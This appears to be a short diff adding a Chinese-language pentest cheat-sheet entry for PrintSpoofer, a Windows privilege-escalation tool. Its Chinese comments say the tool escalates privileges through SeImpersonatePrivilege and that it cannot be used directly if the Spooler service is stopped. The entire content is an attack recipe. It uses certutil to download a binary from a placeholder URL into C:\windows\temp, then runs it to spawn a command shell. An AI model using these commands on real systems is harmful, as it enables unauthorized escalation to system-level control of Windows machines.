@@ -1,0 +1,8 @@
+项目地址:https://github.com/itm4n/PrintSpoofer
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+C:\windows\temp\$badfile -i -c cmd
+
+###
+这是一个利用SeImpersonatePrivilege特权进行提权的程序
+如果失败，可检查服务状态：Get-Service Spooler，stop则无法直接利用
+###
